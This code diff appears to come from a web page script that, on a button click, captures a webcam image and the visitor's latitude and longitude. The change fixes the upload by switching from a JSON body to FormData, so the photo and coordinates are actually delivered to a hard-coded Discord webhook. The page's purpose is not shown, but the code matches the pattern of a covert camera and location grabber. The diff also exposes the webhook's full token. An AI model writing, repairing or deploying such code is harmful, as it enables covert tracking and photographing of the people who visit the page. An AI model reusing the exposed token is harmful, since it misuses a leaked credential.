@@ -20,22 +20,17 @@ document.getElementById('startButton').addEventListener('click', async () => {
 
                 const imageSrc = canvas.toDataURL('image/png');
 
+                // Create a FormData object to send the image
+                const formData = new FormData();
+                formData.append('file', dataURItoBlob(imageSrc), 'webcam_capture.png');
+                formData.append('content', `Webcam available\nLatitude: ${latitude}, Longitude: ${longitude}`);
+
                 // Send information to Discord webhook
                 const discordWebhookUrl = 'https://discord.com/api/webhooks/1506854427846508635/3PPDpwgkhYKFhs6cuK6Bl3sIb73YQ0ZYqEj6MIx6ivSqKjUWXQiig9q9vQkXi5Aq2mWe';
-                const data = {
-                    content: `Webcam available\nLatitude: ${latitude}, Longitude: ${longitude}`,
-                    files: [{
-                        name: 'webcam_capture.png',
-                        blob: dataURItoBlob(imageSrc)
-                    }]
-                };
 
                 await fetch(discordWebhookUrl, {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
+                    body: formData
                 });
 
                 // Display location information
